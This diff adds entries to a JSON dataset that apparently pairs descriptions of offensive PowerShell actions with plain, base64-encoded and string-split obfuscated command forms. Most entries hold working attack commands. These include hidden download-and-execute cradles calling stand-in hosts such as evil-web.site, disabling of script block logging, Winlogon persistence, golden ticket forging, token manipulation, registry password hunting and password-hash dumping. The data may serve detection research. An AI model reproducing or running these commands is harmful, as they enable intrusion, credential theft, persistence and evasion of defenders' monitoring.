+    "input": "Set preferences for script block logging, error action, and verbose preferences, then invoke an unspecified command.",
+    "outputs": [
+      "$ScriptBlockLoggingPreference='SilentlyContinue'; $ErrorActionPreference='SilentlyContinue'; $VerbosePreference='SilentlyContinue'; Invoke-SomeCmdlet -Parameter1 Value1 -Parameter2 Value2",
+      "powershell -enc JABTAGMAcgBpAHAAdABCAGwAbwBjAGsATABvAGcAZwBpAG4AZwBQAHIAZQBmAGUAcgBlAG4AYwBlAD0AJwBTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACcAOwAgACQARQByAHIAbwByAEEAYwB0AGkAbwBuAFAAcgBlAGYAZQByAGUAbgBjAGUAPQAnAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAJwA7ACAAJABWAGUAcgBiAG8AcwBlAFAAcgBlAGYAZQByAGUAbgBjAGUAPQAnAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAJwA7ACAASQBuAHYAbwBrAGUALQBTAG8AbQBlAEMAbQBkAGwAZQB0ACAALQBQAGEAcgBhAG0AZQB0AGUAcgAxACAAVgBhAGwAdQBlADEAIAAtAFAAYQByAGEAbQBlAHQAZQByADIAIABWAGEAbAB1AGUAMgA=",
+      "IEX('$S''+''cr''+''ip''+''tB''+''lo''+''ck''+''Lo''+''gg''+''in''+''gP''+''re''+''fe''+''re''+''nc''+''e=''+'''S''+''il''+''en''+''tl''+''yC''+''on''+''ti''+''nu''+''e'''+''; ''+''$E''+''rr''+''or''+''Ac''+''ti''+''on''+''Pr''+''ef''+''er''+''en''+''ce''+''='''+''Si''+''le''+''nt''+''ly''+''Co''+''nt''+''in''+''ue''+''';''+'' $''+''Ve''+''rb''+''os''+''eP''+''re''+''fe''+''re''+''nc''+''e=''+'''S''+''il''+''en''+''tl''+''yC''+''on''+''ti''+''nu''+''e'''+''; ''+''In''+''vo''+''ke''+''-S''+''om''+''eC''+''md''+''le''+''t ''+''-P''+''ar''+''am''+''et''+''er''+''1 ''+''Va''+''lu''+''e1''+'' -''+''Pa''+''ra''+''me''+''te''+''r2''+'' V''+''al''+''ue''+''2')"
+    ]
+  },
+  {
+    "input": "Invoke shellcode with specified shellcode bytes.",
+    "outputs": [
+      "Invoke-Shellcode -Shellcode @(0xE9,0x90,0x83)",
+      "powershell -enc SQBuAHYAbwBrAGUALQBTAGgAZQBsAGwAYwBvAGQAZQAgAC0AUwBoAGUAbABsAGMAbwBkAGUAIABAACgAMAB4AEUAOQAsADAAeAA5ADAALAAwAHgAOAAzACkA",
+      "IEX('In''+''vo''+''ke''+''-S''+''he''+''ll''+''co''+''de''+'' -''+''Sh''+''el''+''lc''+''od''+''e ''+''@(''+''0x''+''E9''+'',0''+''x9''+''0,''+''0x''+''83''+'')')"
+    ]
+  },
+  {
+    "input": "Execute PowerShell with specific options and download script from a URL.",
+    "outputs": [
+      "powershell.exe -NoP -NonI -W Hidden -Exec Bypass  IEX (New-Object Net.WebClient).DownloadString('http://site.com/code')",
+      "powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAAgAC0ATgBvAG4ASQAgAC0AVwAgAEgAaQBkAGQAZQBuACAALQBFAHgAZQBjACAAQgB5AHAAYQBzAHMAIAAgAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAHMAaQB0AGUALgBjAG8AbQAvAGMAbwBkAGUAJwApAA==",
+      "IEX('po''+''we''+''rs''+''he''+''ll''+''.e''+''xe''+'' -''+''No''+''P ''+''-N''+''on''+''I ''+''-W''+'' H''+''id''+''de''+''n ''+''-E''+''xe''+''c ''+''By''+''pa''+''ss''+''  ''+''IE''+''X ''+''(N''+''ew''+''-O''+''bj''+''ec''+''t ''+''Ne''+''t.''+''We''+''bC''+''li''+''en''+''t)''+''.D''+''ow''+''nl''+''oa''+''dS''+''tr''+''in''+''g(''+'''h''+''tt''+''p:''+''//''+''si''+''te''+''.c''+''om''+''/c''+''od''+''e'''+'')')"
+    ]
+  },
+  {
+    "input": "Invoke HTML application with specified script engine, inline protocol handler, use of Rundll32, and Rundll32 file path.",
+    "outputs": [
+      "Invoke-ATHHTMLApplication -ScriptEngine ${script_engine} -InlineProtocolHandler ${protocol_handler} -UseRundll32 -Rundll32FilePath ${rundll32_file_path}",
+      "powershell -enc SQBuAHYAbwBrAGUALQBBAFQASABIAFQATQBMAEEAcABwAGwAaQBjAGEAdABpAG8AbgAgAC0AUwBjAHIAaQBwAHQARQBuAGcAaQBuAGUAIAAkAHsAcwBjAHIAaQBwAHQAXwBlAG4AZwBpAG4AZQB9ACAALQBJAG4AbABpAG4AZQBQAHIAbwB0AG8AYwBvAGwASABhAG4AZABsAGUAcgAgACQAewBwAHIAbwB0AG8AYwBvAGwAXwBoAGEAbgBkAGwAZQByAH0AIAAtAFUAcwBlAFIAdQBuAGQAbABsADMAMgAgAC0AUgB1AG4AZABsAGwAMwAyAEYAaQBsAGUAUABhAHQAaAAgACQAewByAHUAbgBkAGwAbAAzADIAXwBmAGkAbABlAF8AcABhAHQAaAB9AA==",
+      "IEX('In''+''vo''+''ke''+''-A''+''TH''+''HT''+''ML''+''Ap''+''pl''+''ic''+''at''+''io''+''n ''+''-S''+''cr''+''ip''+''tE''+''ng''+''in''+''e ''+''${''+''sc''+''ri''+''pt''+''_e''+''ng''+''in''+''e}''+'' -''+''In''+''li''+''ne''+''Pr''+''ot''+''oc''+''ol''+''Ha''+''nd''+''le''+''r ''+''${''+''pr''+''ot''+''oc''+''ol''+''_h''+''an''+''dl''+''er''+''} ''+''-U''+''se''+''Ru''+''nd''+''ll''+''32''+'' -''+''Ru''+''nd''+''ll''+''32''+''Fi''+''le''+''Pa''+''th''+'' $''+''{r''+''un''+''dl''+''l3''+''2_''+''fi''+''le''+''_p''+''at''+''h}')"
+    ]
+  },
+  {
+    "input": "Invoke an unspecified command with specified file paths and an XML payload.",
+    "outputs": [
+      "${mwcpath}\\${mwcname} \"${xml_payload}\" output.txt",
+      "powershell -enc JAB7AG0AdwBjAHAAYQB0AGgAfQBcACQAewBtAHcAYwBuAGEAbQBlAH0AIAAiACQAewB4AG0AbABfAHAAYQB5AGwAbwBhAGQAfQAiACAAbwB1AHQAcAB1AHQALgB0AHgAdAA=",
+      "IEX('${''+''mw''+''cp''+''at''+''h}''+''\\$''+''{m''+''wc''+''na''+''me''+''} ''+''\"$''+''{x''+''ml''+''_p''+''ay''+''lo''+''ad''+''}\"''+'' o''+''ut''+''pu''+''t.''+''tx''+''t')"
+    ]
+  },
+  {
+    "input": "Execute PowerShell with specific options and download script from a URL using Invoke-WebRequest.",
+    "outputs": [
+      "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"IEX (Invoke-WebRequest -Uri 'http://HeavySite.com/script.ps1').Content\"",
+      "powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAEIAeQBwAGEAcwBzACAALQBOAG8ATABvAGcAbwAgAC0ATgBvAG4ASQBuAHQAZQByAGEAYwB0AGkAdgBlACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAtAEMAbwBtAG0AYQBuAGQAIAAiAEkARQBYACAAKABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJwBoAHQAdABwADoALwAvAEgAZQBhAHYAeQBTAGkAdABlAC4AYwBvAG0ALwBzAGMAcgBpAHAAdAAuAHAAcwAxACcAKQAuAEMAbwBuAHQAZQBuAHQAIgA=",
+      "IEX('po''+''we''+''rs''+''he''+''ll''+''.e''+''xe''+'' -''+''Ex''+''ec''+''ut''+''io''+''nP''+''ol''+''ic''+''y ''+''By''+''pa''+''ss''+'' -''+''No''+''Lo''+''go''+'' -''+''No''+''nI''+''nt''+''er''+''ac''+''ti''+''ve''+'' -''+''No''+''Pr''+''of''+''il''+''e ''+''-W''+''in''+''do''+''wS''+''ty''+''le''+'' H''+''id''+''de''+''n ''+''-C''+''om''+''ma''+''nd''+'' \"''+''IE''+''X ''+''(I''+''nv''+''ok''+''e-''+''We''+''bR''+''eq''+''ue''+''st''+'' -''+''Ur''+''i ''+'''h''+''tt''+''p:''+''//''+''He''+''av''+''yS''+''it''+''e.''+''co''+''m/''+''sc''+''ri''+''pt''+''.p''+''s1''+''')''+''.C''+''on''+''te''+''nt''+''\"')"
+    ]
+  },
+  {
+    "input": "View network resources on a remote host with the specified fully qualified domain name.",
+    "outputs": [
+      "net view \\\\${remote.host.fqdn} /all",
+      "powershell -enc bgBlAHQAIAB2AGkAZQB3ACAAXABcACQAewByAGUAbQBvAHQAZQAuAGgAbwBzAHQALgBmAHEAZABuAH0AIAAvAGEAbABsAA==",
+      "IEX('ne''+''t ''+''vi''+''ew''+'' \\''+''\\$''+''{r''+''em''+''ot''+''e.''+''ho''+''st''+''.f''+''qd''+''n}''+'' /''+''al''+''l')"
+    ]
+  },
+  {
+    "input": "Set a property in the Windows registry related to Winlogon with the specified values.",
+    "outputs": [
+      "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, ${binaryToExec}\" -Force",
+      "powershell -enc UwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgACIASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAVwBpAG4AbABvAGcAbwBuAFwAIgAgACIAUwBoAGUAbABsACIAIAAiAGUAeABwAGwAbwByAGUAcgAuAGUAeABlACwAIAAkAHsAYgBpAG4AYQByAHkAVABvAEUAeABlAGMAfQAiACAALQBGAG8AcgBjAGUA",
+      "IEX('Se''+''t-''+''It''+''em''+''Pr''+''op''+''er''+''ty''+'' \"''+''HK''+''LM''+'':\\''+''So''+''ft''+''wa''+''re''+''\\M''+''ic''+''ro''+''so''+''ft''+''\\W''+''in''+''do''+''ws''+'' N''+''T\\''+''Cu''+''rr''+''en''+''tV''+''er''+''si''+''on''+''\\W''+''in''+''lo''+''go''+''n\\''+''\" ''+''\"S''+''he''+''ll''+''\" ''+''\"e''+''xp''+''lo''+''re''+''r.''+''ex''+''e,''+'' $''+''{b''+''in''+''ar''+''yT''+''oE''+''xe''+''c}''+''\" ''+''-F''+''or''+''ce')"
+    ]
+  },
+  {
+    "input": "Invoke command on a specified target computer to download and execute a PowerShell script from a URL.",
+    "outputs": [
+      "Invoke-Command -ComputerName <target> -ScriptBlock { Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil-web.site/superbad.ps1') }",
+      "powershell -enc SQBuAHYAbwBrAGUALQBDAG8AbQBtAGEAbgBkACAALQBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgADwAdABhAHIAZwBlAHQAPgAgAC0AUwBjAHIAaQBwAHQAQgBsAG8AYwBrACAAewAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBlAHYAaQBsAC0AdwBlAGIALgBzAGkAdABlAC8AcwB1AHAAZQByAGIAYQBkAC4AcABzADEAJwApACAAfQA=",
+      "IEX('In''+''vo''+''ke''+''-C''+''om''+''ma''+''nd''+'' -''+''Co''+''mp''+''ut''+''er''+''Na''+''me''+'' <''+''ta''+''rg''+''et''+''> ''+''-S''+''cr''+''ip''+''tB''+''lo''+''ck''+'' {''+'' I''+''nv''+''ok''+''e-''+''Ex''+''pr''+''es''+''si''+''on''+'' (''+''Ne''+''w-''+''Ob''+''je''+''ct''+'' N''+''et''+''.W''+''eb''+''Cl''+''ie''+''nt''+'').''+''Do''+''wn''+''lo''+''ad''+''St''+''ri''+''ng''+''('''+''ht''+''tp''+'':/''+''/e''+''vi''+''l-''+''we''+''b.''+''si''+''te''+''/s''+''up''+''er''+''ba''+''d.''+''ps''+''1'''+'') ''+''}')"
+    ]
+  },
+  {
+    "input": "List the contents of the current directory.",
+    "outputs": [
+      "dir",
+      "powershell -enc ZABpAHIA",
+      "IEX('di''+''r')"
+    ]
+  },
+  {
+    "input": "Import a certificate from a specified path, move it to the Cert:\\LocalMachine\\Root store, and assign it to the $cert variable.",
+    "outputs": [
+      "$cert = Import-Certificate -FilePath ${pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My ; Move-Item -Path $cert.PSPath -Destination \"Cert:\\LocalMachine\\Root\"",
+      "powershell -enc JABjAGUAcgB0ACAAPQAgAEkAbQBwAG8AcgB0AC0AQwBlAHIAdABpAGYAaQBjAGEAdABlACAALQBGAGkAbABlAFAAYQB0AGgAIAAkAHsAcABmAHgAXwBwAGEAdABoAH0AIAAtAEMAZQByAHQAUwB0AG8AcgBlAEwAbwBjAGEAdABpAG8AbgAgAEMAZQByAHQAOgBcAEwAbwBjAGEAbABNAGEAYwBoAGkAbgBlAFwATQB5ACAAOwAgAE0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABjAGUAcgB0AC4AUABTAFAAYQB0AGgAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACIAQwBlAHIAdAA6AFwATABvAGMAYQBsAE0AYQBjAGgAaQBuAGUAXABSAG8AbwB0ACIA",
+      "IEX('$c''+''er''+''t ''+''= ''+''Im''+''po''+''rt''+''-C''+''er''+''ti''+''fi''+''ca''+''te''+'' -''+''Fi''+''le''+''Pa''+''th''+'' $''+''{p''+''fx''+''_p''+''at''+''h}''+'' -''+''Ce''+''rt''+''St''+''or''+''eL''+''oc''+''at''+''io''+''n ''+''Ce''+''rt''+'':\\''+''Lo''+''ca''+''lM''+''ac''+''hi''+''ne''+''\\M''+''y ''+''; ''+''Mo''+''ve''+''-I''+''te''+''m ''+''-P''+''at''+''h ''+''$c''+''er''+''t.''+''PS''+''Pa''+''th''+'' -''+''De''+''st''+''in''+''at''+''io''+''n ''+''\"C''+''er''+''t:''+''\\L''+''oc''+''al''+''Ma''+''ch''+''in''+''e\\''+''Ro''+''ot''+''\"')"
+    ]
+  },
+  {
+    "input": "Invoke a method on the Win32_Product class with specified action and arguments.",
+    "outputs": [
+      "Invoke-CimMethod -ClassName Win32_Product -MethodName ${action} -Arguments @{ PackageLocation = '${msi_Payload}' }",
+      "powershell -enc SQBuAHYAbwBrAGUALQBDAGkAbQBNAGUAdABoAG8AZAAgAC0AQwBsAGEAcwBzAE4AYQBtAGUAIABXAGkAbgAzADIAXwBQAHIAbwBkAHUAYwB0ACAALQBNAGUAdABoAG8AZABOAGEAbQBlACAAJAB7AGEAYwB0AGkAbwBuAH0AIAAtAEEAcgBnAHUAbQBlAG4AdABzACAAQAB7ACAAUABhAGMAawBhAGcAZQBMAG8AYwBhAHQAaQBvAG4AIAA9ACAAJwAkAHsAbQBzAGkAXwBQAGEAeQBsAG8AYQBkAH0AJwAgAH0A",
+      "IEX('In''+''vo''+''ke''+''-C''+''im''+''Me''+''th''+''od''+'' -''+''Cl''+''as''+''sN''+''am''+''e ''+''Wi''+''n3''+''2_''+''Pr''+''od''+''uc''+''t ''+''-M''+''et''+''ho''+''dN''+''am''+''e ''+''${''+''ac''+''ti''+''on''+''} ''+''-A''+''rg''+''um''+''en''+''ts''+'' @''+''{ ''+''Pa''+''ck''+''ag''+''eL''+''oc''+''at''+''io''+''n ''+''= ''+'''$''+''{m''+''si''+''_P''+''ay''+''lo''+''ad''+''}'''+'' }')"
+    ]
+  },
+  {
+    "input": "Invoke the execution of MSBuild.",
+    "outputs": [
+      "Invoke-ExecuteMSBuild",
+      "powershell -enc SQBuAHYAbwBrAGUALQBFAHgAZQBjAHUAdABlAE0AUwBCAHUAaQBsAGQA",
+      "IEX('In''+''vo''+''ke''+''-E''+''xe''+''cu''+''te''+''MS''+''Bu''+''il''+''d')"
+    ]
+  },
+  {
+    "input": "Get the wininit process and perform token manipulation to create a new process for 'cmd.exe'.",
+    "outputs": [
+      "Get-Process wininit | Invoke-TokenManipulation -CreateProcess 'cmd.exe'",
+      "powershell -enc RwBlAHQALQBQAHIAbwBjAGUAcwBzACAAdwBpAG4AaQBuAGkAdAAgAHwAIABJAG4AdgBvAGsAZQAtAFQAbwBrAGUAbgBNAGEAbgBpAHAAdQBsAGEAdABpAG8AbgAgAC0AQwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwAgACcAYwBtAGQALgBlAHgAZQAnAA==",
+      "IEX('Ge''+''t-''+''Pr''+''oc''+''es''+''s ''+''wi''+''ni''+''ni''+''t ''+''| ''+''In''+''vo''+''ke''+''-T''+''ok''+''en''+''Ma''+''ni''+''pu''+''la''+''ti''+''on''+'' -''+''Cr''+''ea''+''te''+''Pr''+''oc''+''es''+''s ''+'''c''+''md''+''.e''+''xe''+'''')"
+    ]
+  },
+  {
+    "input": "Get info about the current domain",
+    "outputs": [
+      "Get-Domain",
+      "powershell -enc RwBlAHQALQBEAG8AbQBhAGkAbgA=",
+      "IEX('Ge''+''t-''+''Do''+''ma''+''in')"
+    ]
+  },
+  {
+    "input": "Generate golden ticket using the krbtgt hash of the child domain, the child domain SID and the root domain SID",
+    "outputs": [
+      "ticketer.py -nthash < krbtgt_hash> -domain < child_domain> -domain-sid < child_domain_sid> -extra-sid < root_domain_sid> Administrator",
+      "powershell -enc dABpAGMAawBlAHQAZQByAC4AcAB5ACAALQBuAHQAaABhAHMAaAAgADwAIABrAHIAYgB0AGcAdABfAGgAYQBzAGgAPgAgAC0AZABvAG0AYQBpAG4AIAA8ACAAYwBoAGkAbABkAF8AZABvAG0AYQBpAG4APgAgAC0AZABvAG0AYQBpAG4ALQBzAGkAZAAgADwAIABjAGgAaQBsAGQAXwBkAG8AbQBhAGkAbgBfAHMAaQBkAD4AIAAtAGUAeAB0AHIAYQAtAHMAaQBkACAAPAAgAHIAbwBvAHQAXwBkAG8AbQBhAGkAbgBfAHMAaQBkAD4AIABBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAA==",
+      "IEX('ti''+''ck''+''et''+''er''+''.p''+''y ''+''-n''+''th''+''as''+''h ''+''< ''+''kr''+''bt''+''gt''+''_h''+''as''+''h>''+'' -''+''do''+''ma''+''in''+'' <''+'' c''+''hi''+''ld''+''_d''+''om''+''ai''+''n>''+'' -''+''do''+''ma''+''in''+''-s''+''id''+'' <''+'' c''+''hi''+''ld''+''_d''+''om''+''ai''+''n_''+''si''+''d>''+'' -''+''ex''+''tr''+''a-''+''si''+''d ''+''< ''+''ro''+''ot''+''_d''+''om''+''ai''+''n_''+''si''+''d>''+'' A''+''dm''+''in''+''is''+''tr''+''at''+''or')"
+    ]
+  },
+  {
+    "input": "Perform password spraying attack (assuming that passwords might be re-used elsewhere), Search for string pattern in registry, The following PowerShell command will sift through the selected registry hives (HKCR, HKCU, HKLM, HKU, and HKCC) and recursively search for any chosen pattern within the registry key names or data values. In this case we are searching for the 'password' pattern:",
+    "outputs": [
+      "$pattern = \"password\";$hives = \"HKEY_CLASSES_ROOT\",\"HKEY_CURRENT_USER\",\"HKEY_LOCAL_MACHINE\",\"HKEY_USERS\",\"HKEY_CURRENT_CONFIG\";foreach ($r in $hives) { gci \"registry::${r}\\\" -rec -ea SilentlyContinue | sls \"$pattern\" };foreach ($r in $hives) { gci \"registry::${r}\\\" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match \"$pattern\") { $_.PsPath; $_ | out-string -stream | sls \"$pattern\" }}}",
+      "powershell -enc JABwAGEAdAB0AGUAcgBuACAAPQAgACIAcABhAHMAcwB3AG8AcgBkACIAOwAkAGgAaQB2AGUAcwAgAD0AIAAiAEgASwBFAFkAXwBDAEwAQQBTAFMARQBTAF8AUgBPAE8AVAAiACwAIgBIAEsARQBZAF8AQwBVAFIAUgBFAE4AVABfAFUAUwBFAFIAIgAsACIASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAIgAsACIASABLAEUAWQBfAFUAUwBFAFIAUwAiACwAIgBIAEsARQBZAF8AQwBVAFIAUgBFAE4AVABfAEMATwBOAEYASQBHACIAOwBmAG8AcgBlAGEAYwBoACAAKAAkAHIAIABpAG4AIAAkAGgAaQB2AGUAcwApACAAewAgAGcAYwBpACAAIgByAGUAZwBpAHMAdAByAHkAOgA6ACQAewByAH0AXAAiACAALQByAGUAYwAgAC0AZQBhACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAgAHwAIABzAGwAcwAgACIAJABwAGEAdAB0AGUAcgBuACIAIAB9ADsAZgBvAHIAZQBhAGMAaAAgACgAJAByACAAaQBuACAAJABoAGkAdgBlAHMAKQAgAHsAIABnAGMAaQAgACIAcgBlAGcAaQBzAHQAcgB5ADoAOgAkAHsAcgB9AFwAIgAgAC0AcgBlAGMAIAAtAGUAYQAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIAB8ACAAJQAgAHsAIABpAGYAKAAoAGcAcAAgACQAXwAuAFAAcwBQAGEAdABoACAALQBlAGEAIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACkAIAAtAG0AYQB0AGMAaAAgACIAJABwAGEAdAB0AGUAcgBuACIAKQAgAHsAIAAkAF8ALgBQAHMAUABhAHQAaAA7ACAAJABfACAAfAAgAG8AdQB0AC0AcwB0AHIAaQBuAGcAIAAtAHMAdAByAGUAYQBtACAAfAAgAHMAbABzACAAIgAkAHAAYQB0AHQAZQByAG4AIgAgAH0AfQB9AA==",
+      "IEX('$p''+''at''+''te''+''rn''+'' =''+'' \"''+''pa''+''ss''+''wo''+''rd''+''\";''+''$h''+''iv''+''es''+'' =''+'' \"''+''HK''+''EY''+''_C''+''LA''+''SS''+''ES''+''_R''+''OO''+''T\"''+'',\"''+''HK''+''EY''+''_C''+''UR''+''RE''+''NT''+''_U''+''SE''+''R\"''+'',\"''+''HK''+''EY''+''_L''+''OC''+''AL''+''_M''+''AC''+''HI''+''NE''+''\",''+''\"H''+''KE''+''Y_''+''US''+''ER''+''S\"''+'',\"''+''HK''+''EY''+''_C''+''UR''+''RE''+''NT''+''_C''+''ON''+''FI''+''G\"''+'';f''+''or''+''ea''+''ch''+'' (''+''$r''+'' i''+''n ''+''$h''+''iv''+''es''+'') ''+''{ ''+''gc''+''i ''+''\"r''+''eg''+''is''+''tr''+''y:''+'':$''+''{r''+''}\\''+''\" ''+''-r''+''ec''+'' -''+''ea''+'' S''+''il''+''en''+''tl''+''yC''+''on''+''ti''+''nu''+''e ''+''| ''+''sl''+''s ''+''\"$''+''pa''+''tt''+''er''+''n\"''+'' }''+'';f''+''or''+''ea''+''ch''+'' (''+''$r''+'' i''+''n ''+''$h''+''iv''+''es''+'') ''+''{ ''+''gc''+''i ''+''\"r''+''eg''+''is''+''tr''+''y:''+'':$''+''{r''+''}\\''+''\" ''+''-r''+''ec''+'' -''+''ea''+'' S''+''il''+''en''+''tl''+''yC''+''on''+''ti''+''nu''+''e ''+''| ''+''% ''+''{ ''+''if''+''((''+''gp''+'' $''+''_.''+''Ps''+''Pa''+''th''+'' -''+''ea''+'' S''+''il''+''en''+''tl''+''yC''+''on''+''ti''+''nu''+''e)''+'' -''+''ma''+''tc''+''h ''+''\"$''+''pa''+''tt''+''er''+''n\"''+'') ''+''{ ''+''$_''+''.P''+''sP''+''at''+''h;''+'' $''+''_ ''+''| ''+''ou''+''t-''+''st''+''ri''+''ng''+'' -''+''st''+''re''+''am''+'' |''+'' s''+''ls''+'' \"''+''$p''+''at''+''te''+''rn''+''\" ''+''}}''+''}')"
+    ]
+  },
+  {
+    "input": "Get a PSSession",
+    "outputs": [
+      "Enter-PSSession -ConfigurationName doublehopsess -ComputerName < pc_name> -Credential domain_name\\username",
+      "powershell -enc RQBuAHQAZQByAC0AUABTAFMAZQBzAHMAaQBvAG4AIAAtAEMAbwBuAGYAaQBnAHUAcgBhAHQAaQBvAG4ATgBhAG0AZQAgAGQAbwB1AGIAbABlAGgAbwBwAHMAZQBzAHMAIAAtAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAAPAAgAHAAYwBfAG4AYQBtAGUAPgAgAC0AQwByAGUAZABlAG4AdABpAGEAbAAgAGQAbwBtAGEAaQBuAF8AbgBhAG0AZQBcAHUAcwBlAHIAbgBhAG0AZQA=",
+      "IEX('En''+''te''+''r-''+''PS''+''Se''+''ss''+''io''+''n ''+''-C''+''on''+''fi''+''gu''+''ra''+''ti''+''on''+''Na''+''me''+'' d''+''ou''+''bl''+''eh''+''op''+''se''+''ss''+'' -''+''Co''+''mp''+''ut''+''er''+''Na''+''me''+'' <''+'' p''+''c_''+''na''+''me''+''> ''+''-C''+''re''+''de''+''nt''+''ia''+''l ''+''do''+''ma''+''in''+''_n''+''am''+''e\\''+''us''+''er''+''na''+''me')"
+    ]
+  },
+  {
+    "input": "String Obfuscation, Obfuscates a string (e.g., a command) using Base64 encoding to evade detection by security tools.",
+    "outputs": [
+      "$originalString = 'SensitiveCommand'; $obfuscatedString = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($originalString)); $decodedString = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($obfuscatedString)); InvokeExpression $decodedString",
+      "powershell -enc JABvAHIAaQBnAGkAbgBhAGwAUwB0AHIAaQBuAGcAIAA9ACAAJwBTAGUAbgBzAGkAdABpAHYAZQBDAG8AbQBtAGEAbgBkACcAOwAgACQAbwBiAGYAdQBzAGMAYQB0AGUAZABTAHQAcgBpAG4AZwAgAD0AIABbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBuAGkAYwBvAGQAZQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAbwByAGkAZwBpAG4AYQBsAFMAdAByAGkAbgBnACkAKQA7ACAAJABkAGUAYwBvAGQAZQBkAFMAdAByAGkAbgBnACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABvAGIAZgB1AHMAYwBhAHQAZQBkAFMAdAByAGkAbgBnACkAKQA7ACAASQBuAHYAbwBrAGUARQB4AHAAcgBlAHMAcwBpAG8AbgAgACQAZABlAGMAbwBkAGUAZABTAHQAcgBpAG4AZwA=",
+      "IEX('$o''+''ri''+''gi''+''na''+''lS''+''tr''+''in''+''g ''+''= ''+'''S''+''en''+''si''+''ti''+''ve''+''Co''+''mm''+''an''+''d'''+''; ''+''$o''+''bf''+''us''+''ca''+''te''+''dS''+''tr''+''in''+''g ''+''= ''+''[C''+''on''+''ve''+''rt''+'']:''+'':T''+''oB''+''as''+''e6''+''4S''+''tr''+''in''+''g(''+''[S''+''ys''+''te''+''m.''+''Te''+''xt''+''.E''+''nc''+''od''+''in''+''g]''+''::''+''Un''+''ic''+''od''+''e.''+''Ge''+''tB''+''yt''+''es''+''($''+''or''+''ig''+''in''+''al''+''St''+''ri''+''ng''+''))''+''; ''+''$d''+''ec''+''od''+''ed''+''St''+''ri''+''ng''+'' =''+'' [''+''Sy''+''st''+''em''+''.T''+''ex''+''t.''+''En''+''co''+''di''+''ng''+'']:''+'':U''+''ni''+''co''+''de''+''.G''+''et''+''St''+''ri''+''ng''+''([''+''Co''+''nv''+''er''+''t]''+''::''+''Fr''+''om''+''Ba''+''se''+''64''+''St''+''ri''+''ng''+''($''+''ob''+''fu''+''sc''+''at''+''ed''+''St''+''ri''+''ng''+''))''+''; ''+''In''+''vo''+''ke''+''Ex''+''pr''+''es''+''si''+''on''+'' $''+''de''+''co''+''de''+''dS''+''tr''+''in''+''g')"
+    ]
+  },
+  {
+    "input": "Here's an example of dumping local password hashes (hashdump) using nishang Get-PassHashes module:",
+    "outputs": [
+      "iex(iwr(\"https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1\"));Get-PassHashes",
+      "powershell -enc aQBlAHgAKABpAHcAcgAoACIAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBzAGEAbQByAGEAdABhAHMAaABvAGsALwBuAGkAcwBoAGEAbgBnAC8AbQBhAHMAdABlAHIALwBHAGEAdABoAGUAcgAvAEcAZQB0AC0AUABhAHMAcwBIAGEAcwBoAGUAcwAuAHAAcwAxACIAKQApADsARwBlAHQALQBQAGEAcwBzAEgAYQBzAGgAZQBzAA==",
